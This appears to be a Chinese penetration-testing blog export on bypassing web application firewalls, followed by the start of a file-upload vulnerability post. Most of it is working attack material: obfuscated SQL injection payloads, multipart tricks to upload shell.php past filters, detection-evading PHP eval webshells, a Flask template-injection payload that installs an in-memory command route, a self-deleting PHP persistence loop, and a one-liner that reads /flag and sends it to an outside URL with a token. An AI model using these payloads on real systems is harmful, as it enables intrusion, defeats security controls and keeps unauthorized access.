</span>Keep-Alive</span><br></pre></td></tr></table></figure><p>需要关闭</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>推荐阅读</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>想办法让WAF以为我们是在上传文件，而实际上却是在POST一个参数，这个参数可以是命令注入、SQL注入、SSRF等任意的一种攻击，这样就实现了通用WAF Bypass</strong></p><p>何时是上传文件？何时是POST参数呢？这个关键点在于有没有一个完整的，连续的**filename&#x3D;**，中间可以插入<code>\r\n</code>或者<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h4 id="waf特性"><a href="#waf特性" class="headerlink" title="waf特性"></a>waf特性</h4><blockquote><p>部署方式，策略与规则缺陷</p></blockquote><h5 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>​通过改变用户域名的DNS解析地址来将Web流量牵引到云WAF引擎集群，经过检测后再回源至真正的Web服务器。</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>​所以如果可以找到目标的真实ip，就可以绕过云waf。</p><h5 id="性能缺陷"><a href="#性能缺陷" class="headerlink" title="性能缺陷"></a>性能缺陷</h5><h6 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a>高并发</h6><p>用Burp的<code>Trubo Intruder</code>插件,失败</p><p>而且高并发很可能会造成业务系统出现问题。</p><h6 id="脏数据"><a href="#脏数据" class="headerlink" title="脏数据"></a>脏数据</h6><p>为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。</p><h6 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>安全🐕在<code>HTTP BODY</code>中检测到了关键字，直接返回500。。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p><code>waf</code>可能直接检测长度来拦截</p><p>如安全🐕,<code>GET</code>下是不行的</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h5><ul><li><p>文件白名单</p><blockquote><p>一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><p>如：WAF 设立了白名单<code>/admin</code>，那么我们的测试 payload 可以通过如下的手法来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IP白名单</p><blockquote><p>后端通过Header字段获取源IP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR等</span><br></pre></td></tr></table></figure></li><li><p>UA白名单</p><blockquote><p>某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UA收集：<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h5><p>一些 WAF 为了减少服务器的压力，会对静态文件如<code>.png</code>、<code>.css</code>等直接放行，那么我们可以尝试伪装成静态文件来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><ol><li>一些 WAF 对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</li><li>一些 WAF 检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass</p></blockquote><p>测试点</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）：get请求处 </span><br><span class="line">2）：header请求处 </span><br><span class="line">3）：post urlencode内容处 </span><br><span class="line">4）：post form-data内容处</span><br></pre></td></tr></table></figure><p>基础内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）编码过的0-255字符 </span><br><span class="line">2）进行编码的0-255字符 </span><br><span class="line">3）utf gbk字符</span><br></pre></td></tr></table></figure><h3 id="正面硬刚"><a href="#正面硬刚" class="headerlink" title="正面硬刚"></a>正面硬刚</h3><blockquote><p>增增改改混淆视听，使waf的规则和策略失效</p><p><strong>基本方针</strong>：</p><ol><li>增删测试waf容忍度，确认关键点</li><li>本地FUZZ PAYLOAD,先保证可以绕过检测</li><li>再次进行构造使得后端能够进行解析</li></ol></blockquote><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>简单fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤</p><h5 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a><code>union select</code>绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #注释换行</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>在<code>/**/</code>中插入<code>/x/</code>即可，x至少为一个字符</p><h5 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZ结果</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>硬刚G</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分块传输，脏数据等成功</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="waf检测内容"><a href="#waf检测内容" class="headerlink" title="waf检测内容"></a>waf检测内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url</span><br><span class="line">Boundary边界</span><br><span class="line">MIME类型</span><br><span class="line">文件后缀名</span><br><span class="line">文件头</span><br><span class="line">文件内容</span><br><span class="line">访问流量</span><br></pre></td></tr></table></figure><h5 id="文件上传数据包"><a href="#文件上传数据包" class="headerlink" title="文件上传数据包"></a>文件上传数据包</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># 每两个分界线之间是具体的内容：文件上传，post参数</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># 结束标志</span></span><br></pre></td></tr></table></figure><h5 id="安全🐕测试"><a href="#安全🐕测试" class="headerlink" title="安全🐕测试"></a>安全🐕测试</h5><ul><li><p>不允许php后缀上传</p></li><li><p>上传时，不检查文件内容</p></li><li><p>访问时，不允许访问含有恶意内容的php文件</p></li></ul><h6 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">增加多个boundary</span><br><span class="line">php：可以在boundary前后添加任意字符</span><br><span class="line">大小写</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">操作：</span><br><span class="line">大小写</span><br><span class="line">Content-Disposition 任意位置换行,空格，脏数据溢出，多个Content-Disposition，form-data（删除，改为*）</span><br><span class="line">多个filename，多个;</span><br><span class="line">文件名单双引号数量</span><br><span class="line">content-type（增删，设置charset）</span><br><span class="line">多个BODY</span><br><span class="line">多个boundary</span><br><span class="line">交换name和filename的顺序</span><br><span class="line">排列组合</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS 流</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">文件流 (本地文件系统) - Win32 apps | Microsoft Learn</a></p><p>  fuzz可以的</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件名尾加任意个. 或者任意个空格（对文件名无影响）</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">windows文件名的保留字符（不允许出现）</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当filename=shell.php:.jpg</span></span><br><span class="line"><span class="string">结果：</span></span><br><span class="line"><span class="string">可以上传shell.php，但是会吃掉文件内容。。。</span></span><br><span class="line"><span class="string">其他的要不不可以，可以的话，上传的文件名为.jpg</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>文件名长度</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">截断超长文件名windows文件名：长度限制完全限定文件名必须少于<span class="number">260</span>个字符，目录名必须小于<span class="number">248</span>个字符linux文件名：linux中文件名最长为<span class="number">255</span>字符，文件路径最大长度为<span class="number">4096</span>字符如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(<span class="number">200</span>+).php.jpg，把最后的.jpg挤出去，</span><br></pre></td></tr></table></figure></li></ul><p><strong>部分成功的，好绕</strong></p><p>waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数，</p><p>后端就取前一个,waf识别到空</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># 双引号不行</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">除了shell.php处，其他地方加换行，或脏数据都可</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>删除<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>增加<code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>安全🐕+代码白名单（后缀只允许图片）</p><p>上面任意一个绕过（除了；绕过）+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="绕过文件内容检测–免杀"><a href="#绕过文件内容检测–免杀" class="headerlink" title="绕过文件内容检测–免杀"></a>绕过文件内容检测–免杀</h6><p>安全🐕的内容检测随便改一下就过了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="绕过流量"><a href="#绕过流量" class="headerlink" title="绕过流量"></a>绕过流量</h6><p>测试时</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#命令执行限制</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>对流量进行一个<code>base64</code>加密即可</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑</p><p>编码器</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>选择编码器</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h5><p>waf检测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内容、创建日期、文件大小、通信流量特征</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于静态引擎的绕过，可以通过拆分关键词、</span><br><span class="line">加入能够引发解析干扰的畸形字符等;</span><br><span class="line"></span><br><span class="line">而对于动态引擎，需要分析它跟踪了哪些输入</span><br><span class="line">点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">各种混淆（编码加密，进制转换，反序列化...）</span><br><span class="line">信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）</span><br></pre></td></tr></table></figure><p>传统webshell</p><p>学习：</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>收集：</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><p>无文件落地–内存马</p><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>通过注册路由处理来实现注入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x 是可以的</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 僵尸进程 记得编码</span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>僵尸进程 ： 子进程先于父进程退出，父进程又没有处理子进程的退出状态，此时子进程就会称为僵尸进程。</p><p>父进程通过<code>sleep(600)</code>保证子进程优先于父进程退出</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77条消息) python僵尸进程的产生和僵尸进程自动处理_pipe导致僵尸进程_Jimmy-TONG的博客-CSDN博客</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过内存马启动后删除文件本身之前，使代码在内存中执行死循环，使管理员无法删除内存马，达到权限维持的目的。</p><p>JAVA</p><p>放在java安全里</p><h5 id="流量绕过"><a href="#流量绕过" class="headerlink" title="流量绕过"></a>流量绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱特征：HTTP Header</span><br><span class="line">request和response内容</span><br></pre></td></tr></table></figure><p>参考之前HW看的文章</p><ul><li><p>哥斯拉</p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户</a></p></li><li><p>冰蝎</p><p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区</a></p><p><a href="https://www.secpulse.com/archives/195173.html">冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/12453">冰蝎4.0自定义加密 - 先知社区</a></p></li><li><p>蚁剑</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshell类：脚本文件</span><br><span class="line">XSS类：svg，html，pdf文件,如果后端为nodejs，可以xss to rce</span><br><span class="line">SSRF类：PDF</span><br><span class="line">XXE类：docx、xlsx，svg</span><br><span class="line">RCE类：phar文件，配合文件读取反序列化攻击</span><br><span class="line">文件覆盖：文件路径可控</span><br></pre></td></tr></table></figure><p><a href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">PDF解析器html&#x2F;XSS 实现SSRF - 火线 Zone-安全攻防社区</a></p><h1 id="PHP相关代码"><a href="#PHP相关代码" class="headerlink" title="PHP相关代码"></a>PHP相关代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]是Content-Disposition中name的值</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件名称</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的MIME类型       image/jpeg,image/png</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 文件大小 单位字节</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 加入文件头绕过：GIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  图片大小</span><br><span 